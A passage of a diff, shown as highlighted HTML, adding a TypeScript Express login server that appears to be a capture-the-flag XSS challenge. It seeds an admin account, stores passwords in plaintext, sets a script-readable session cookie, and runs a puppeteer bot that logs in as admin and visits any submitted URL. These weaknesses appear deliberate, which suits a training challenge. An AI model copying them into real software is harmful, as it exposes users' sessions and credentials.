+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">mongoUri</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">MONGO_URI</span> <span class="o">||</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">MONGO_URL</span> <span class="o">||</span> <span class="s1">&#39;mongodb://127.0.0.1:27017/easy_login&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">dbName</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">MONGO_DB_NAME</span> <span class="o">||</span> <span class="s1">&#39;easy_login&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">FLAG</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">FLAG</span> <span class="o">||</span> <span class="s1">&#39;flag{dummy_flag_for_testing}&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">APP_INTERNAL_URL</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">APP_INTERNAL_URL</span> <span class="o">||</span> <span class="sb">`http://127.0.0.1:</span><span class="si">${</span><span class="nx">PORT</span><span class="si">}</span><span class="sb">`</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">ADMIN_PASSWORD</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">randomBytes</span><span class="p">(</span><span class="mi">16</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">interface</span> <span class="nx">UserDoc</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">username</span>: <span class="kt">string</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">password</span>: <span class="kt">string</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">interface</span> <span class="nx">SessionDoc</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">sid</span>: <span class="kt">string</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">username</span>: <span class="kt">string</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">createdAt</span>: <span class="kt">Date</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">interface</span> <span class="nx">AuthedRequest</span> <span class="kr">extends</span> <span class="nx">Request</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">user</span><span class="o">?:</span> <span class="p">{</span> <span class="nx">username</span>: <span class="kt">string</span> <span class="p">}</span> <span class="o">|</span> <span class="kc">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">collections</span><span class="o">?:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">users</span>: <span class="kt">Collection</span><span class="p">&lt;</span><span class="nt">UserDoc</span><span class="p">&gt;</span> <span class="o">|</span> <span class="kc">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">sessions</span>: <span class="kt">Collection</span><span class="p">&lt;</span><span class="nt">SessionDoc</span><span class="p">&gt;</span> <span class="o">|</span> <span class="kc">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">};</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">db</span>: <span class="kt">Db</span> <span class="o">|</span> <span class="kc">null</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">usersCollection</span>: <span class="kt">Collection</span><span class="p">&lt;</span><span class="nt">UserDoc</span><span class="p">&gt;</span> <span class="o">|</span> <span class="kc">null</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">sessionsCollection</span>: <span class="kt">Collection</span><span class="p">&lt;</span><span class="nt">SessionDoc</span><span class="p">&gt;</span> <span class="o">|</span> <span class="kc">null</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">publicDir</span> <span class="o">=</span> <span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="s1">&#39;../public&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">async</span> <span class="kd">function</span> <span class="nx">runXssVisit</span><span class="p">(</span><span class="nx">targetUrl</span>: <span class="kt">string</span><span class="p">)</span><span class="o">:</span> <span class="nx">Promise</span><span class="p">&lt;</span><span class="nt">void</span><span class="p">&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">targetUrl</span> <span class="o">!==</span> <span class="s1">&#39;string&#39;</span> <span class="o">||</span> <span class="o">!</span><span class="sr">/^https?:\/\//i</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">targetUrl</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">throw</span> <span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="s1">&#39;invalid target url&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">browser</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">puppeteer</span><span class="p">.</span><span class="nx">launch</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">headless</span>: <span class="kt">true</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">args</span><span class="o">:</span> <span class="p">[</span><span class="s1">&#39;--no-sandbox&#39;</span><span class="p">,</span> <span class="s1">&#39;--disable-setuid-sandbox&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">  <span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">page</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">browser</span><span class="p">.</span><span class="nx">newPage</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">await</span> <span class="nx">page</span><span class="p">.</span><span class="kr">goto</span><span class="p">(</span><span class="nx">APP_INTERNAL_URL</span> <span class="o">+</span> <span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">waitUntil</span><span class="o">:</span> <span class="s1">&#39;networkidle2&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">timeout</span>: <span class="kt">15000</span>
+</span></span><span class="line"><span class="cl">    <span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">await</span> <span class="nx">page</span><span class="p">.</span><span class="kr">type</span><span class="p">(</span><span class="s1">&#39;#username&#39;</span><span class="p">,</span> <span class="s1">&#39;admin&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">delay</span>: <span class="kt">30</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">    <span class="k">await</span> <span class="nx">page</span><span class="p">.</span><span class="kr">type</span><span class="p">(</span><span class="s1">&#39;#password&#39;</span><span class="p">,</span> <span class="nx">ADMIN_PASSWORD</span><span class="p">,</span> <span class="p">{</span> <span class="nx">delay</span>: <span class="kt">30</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">await</span> <span class="nx">Promise</span><span class="p">.</span><span class="nx">all</span><span class="p">([</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">page</span><span class="p">.</span><span class="nx">click</span><span class="p">(</span><span class="s1">&#39;#loginForm button[type=&#34;submit&#34;]&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">page</span><span class="p">.</span><span class="nx">waitForResponse</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">res</span><span class="p">.</span><span class="nx">url</span><span class="p">().</span><span class="nx">endsWith</span><span class="p">(</span><span class="s1">&#39;/login&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">res</span><span class="p">.</span><span class="nx">request</span><span class="p">().</span><span class="nx">method</span><span class="p">()</span> <span class="o">===</span> <span class="s1">&#39;POST&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span> <span class="nx">timeout</span>: <span class="kt">10000</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="p">).</span><span class="k">catch</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="kc">undefined</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">]);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">await</span> <span class="nx">page</span><span class="p">.</span><span class="kr">goto</span><span class="p">(</span><span class="nx">targetUrl</span><span class="p">,</span> <span class="p">{</span> <span class="nx">waitUntil</span><span class="o">:</span> <span class="s1">&#39;networkidle2&#39;</span><span class="p">,</span> <span class="nx">timeout</span>: <span class="kt">15000</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">await</span> <span class="k">new</span> <span class="nx">Promise</span><span class="p">((</span><span class="nx">resolve</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">setTimeout</span><span class="p">(</span><span class="nx">resolve</span><span class="p">,</span> <span class="mi">5000</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">finally</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">await</span> <span class="nx">browser</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">async</span> <span class="kd">function</span> <span class="nx">createSessionForUser</span><span class="p">(</span><span class="nx">user</span>: <span class="kt">UserDoc</span><span class="p">)</span><span class="o">:</span> <span class="nx">Promise</span><span class="p">&lt;</span><span class="nt">string</span><span class="p">&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">sessionsCollection</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">throw</span> <span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="s1">&#39;sessions collection not initialized&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">sid</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">randomBytes</span><span class="p">(</span><span class="mi">16</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">await</span> <span class="nx">sessionsCollection</span><span class="p">.</span><span class="nx">insertOne</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">sid</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">username</span>: <span class="kt">user.username</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">createdAt</span>: <span class="kt">new</span> <span class="nb">Date</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">  <span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">sid</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="nx">json</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="nx">urlencoded</span><span class="p">({</span> <span class="nx">extended</span>: <span class="kt">false</span> <span class="p">}));</span>
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">cookieParser</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="kr">static</span><span class="p">(</span><span class="nx">publicDir</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">async</span> <span class="kd">function</span> <span class="nx">initMongo</span><span class="p">()</span><span class="o">:</span> <span class="nx">Promise</span><span class="p">&lt;</span><span class="nt">void</span><span class="p">&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">client</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">MongoClient</span><span class="p">(</span><span class="nx">mongoUri</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">await</span> <span class="nx">client</span><span class="p">.</span><span class="nx">connect</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">db</span> <span class="o">=</span> <span class="nx">client</span><span class="p">.</span><span class="nx">db</span><span class="p">(</span><span class="nx">dbName</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">usersCollection</span> <span class="o">=</span> <span class="nx">db</span><span class="p">.</span><span class="nx">collection</span><span class="p">&lt;</span><span class="nt">UserDoc</span><span class="p">&gt;(</span><span class="s1">&#39;users&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">sessionsCollection</span> <span class="o">=</span> <span class="nx">db</span><span class="p">.</span><span class="nx">collection</span><span class="p">&lt;</span><span class="nt">SessionDoc</span><span class="p">&gt;(</span><span class="s1">&#39;sessions&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kd">let</span> <span class="nx">adminUser</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">usersCollection</span><span class="p">.</span><span class="nx">findOne</span><span class="p">({</span> <span class="nx">username</span><span class="o">:</span> <span class="s1">&#39;admin&#39;</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">adminUser</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">await</span> <span class="nx">usersCollection</span><span class="p">.</span><span class="nx">insertOne</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">username</span><span class="o">:</span> <span class="s1">&#39;admin&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">password</span>: <span class="kt">ADMIN_PASSWORD</span>
+</span></span><span class="line"><span class="cl">    <span class="p">});</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">await</span> <span class="nx">usersCollection</span><span class="p">.</span><span class="nx">updateOne</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">      <span class="p">{</span> <span class="nx">username</span><span class="o">:</span> <span class="s1">&#39;admin&#39;</span> <span class="p">},</span>
+</span></span><span class="line"><span class="cl">      <span class="p">{</span> <span class="nx">$set</span><span class="o">:</span> <span class="p">{</span> <span class="nx">password</span>: <span class="kt">ADMIN_PASSWORD</span> <span class="p">}</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nx">adminUser</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">usersCollection</span><span class="p">.</span><span class="nx">findOne</span><span class="p">({</span> <span class="nx">username</span><span class="o">:</span> <span class="s1">&#39;admin&#39;</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`[init] Admin password set to: </span><span class="si">${</span><span class="nx">ADMIN_PASSWORD</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">async</span> <span class="kd">function</span> <span class="nx">sessionMiddleware</span><span class="p">(</span><span class="nx">req</span>: <span class="kt">AuthedRequest</span><span class="p">,</span> <span class="nx">res</span>: <span class="kt">Response</span><span class="p">,</span> <span class="nx">next</span>: <span class="kt">NextFunction</span><span class="p">)</span><span class="o">:</span> <span class="nx">Promise</span><span class="p">&lt;</span><span class="nt">void</span><span class="p">&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">sid</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">cookies</span><span class="o">?</span><span class="p">.</span><span class="nx">sid</span> <span class="kr">as</span> <span class="kt">string</span> <span class="o">|</span> <span class="kc">undefined</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">sid</span> <span class="o">||</span> <span class="o">!</span><span class="nx">sessionsCollection</span> <span class="o">||</span> <span class="o">!</span><span class="nx">usersCollection</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">req</span><span class="p">.</span><span class="nx">user</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">next</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">session</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">sessionsCollection</span><span class="p">.</span><span class="nx">findOne</span><span class="p">({</span> <span class="nx">sid</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">session</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">req</span><span class="p">.</span><span class="nx">user</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="nx">next</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">user</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">usersCollection</span><span class="p">.</span><span class="nx">findOne</span><span class="p">({</span> <span class="nx">username</span>: <span class="kt">session.username</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">user</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">req</span><span class="p">.</span><span class="nx">user</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="nx">next</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nx">req</span><span class="p">.</span><span class="nx">user</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">username</span>: <span class="kt">user.username</span> <span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">next</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s1">&#39;Error in session middleware:&#39;</span><span class="p">,</span> <span class="nx">err</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">req</span><span class="p">.</span><span class="nx">user</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">next</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">((</span><span class="nx">req</span>: <span class="kt">AuthedRequest</span><span class="p">,</span> <span class="nx">_res</span>: <span class="kt">Response</span><span class="p">,</span> <span class="nx">next</span>: <span class="kt">NextFunction</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">req</span><span class="p">.</span><span class="nx">collections</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">users</span>: <span class="kt">usersCollection</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">sessions</span>: <span class="kt">sessionsCollection</span>
+</span></span><span class="line"><span class="cl">  <span class="p">};</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">next</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">sessionMiddleware</span> <span class="kr">as</span> <span class="kt">any</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="kr">get</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">_req</span>: <span class="kt">AuthedRequest</span><span class="p">,</span> <span class="nx">res</span>: <span class="kt">Response</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">res</span><span class="p">.</span><span class="nx">sendFile</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">publicDir</span><span class="p">,</span> <span class="s1">&#39;index.html&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/login&#39;</span><span class="p">,</span> <span class="kr">async</span> <span class="p">(</span><span class="nx">req</span>: <span class="kt">AuthedRequest</span><span class="p">,</span> <span class="nx">res</span>: <span class="kt">Response</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="p">{</span> <span class="nx">username</span><span class="p">,</span> <span class="nx">password</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span> <span class="kr">as</span> <span class="p">{</span> <span class="nx">username?</span>: <span class="kt">unknown</span><span class="p">;</span> <span class="nx">password?</span>: <span class="kt">unknown</span> <span class="p">};</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">username</span> <span class="o">!==</span> <span class="s1">&#39;string&#39;</span> <span class="o">||</span> <span class="k">typeof</span> <span class="nx">password</span> <span class="o">!==</span> <span class="s1">&#39;string&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span> <span class="nx">error</span><span class="o">:</span> <span class="s1">&#39;username and password must be strings&#39;</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">username</span> <span class="o">||</span> <span class="o">!</span><span class="nx">password</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span> <span class="nx">error</span><span class="o">:</span> <span class="s1">&#39;username and password required&#39;</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">usersCollection</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span> <span class="nx">error</span><span class="o">:</span> <span class="s1">&#39;Database not initialized yet&#39;</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">user</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">usersCollection</span><span class="p">.</span><span class="nx">findOne</span><span class="p">({</span> <span class="nx">username</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">user</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nx">username</span> <span class="o">===</span> <span class="s1">&#39;admin&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">403</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span> <span class="nx">error</span><span class="o">:</span> <span class="s1">&#39;admin user not available&#39;</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="k">await</span> <span class="nx">usersCollection</span><span class="p">.</span><span class="nx">insertOne</span><span class="p">({</span> <span class="nx">username</span><span class="p">,</span> <span class="nx">password</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">user</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">usersCollection</span><span class="p">.</span><span class="nx">findOne</span><span class="p">({</span> <span class="nx">username</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">user</span> <span class="o">||</span> <span class="nx">user</span><span class="p">.</span><span class="nx">password</span> <span class="o">!==</span> <span class="nx">password</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">401</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span> <span class="nx">error</span><span class="o">:</span> <span class="s1">&#39;invalid credentials&#39;</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">sid</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">createSessionForUser</span><span class="p">(</span><span class="nx">user</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nx">res</span><span class="p">.</span><span class="nx">cookie</span><span class="p">(</span><span class="s1">&#39;sid&#39;</span><span class="p">,</span> <span class="nx">sid</span><span class="p">,</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">httpOnly</span>: <span class="kt">false</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">sameSite</span><span class="o">:</span> <span class="s1">&#39;lax&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">});</span>
+</span></span><span class="line"><span class="cl">
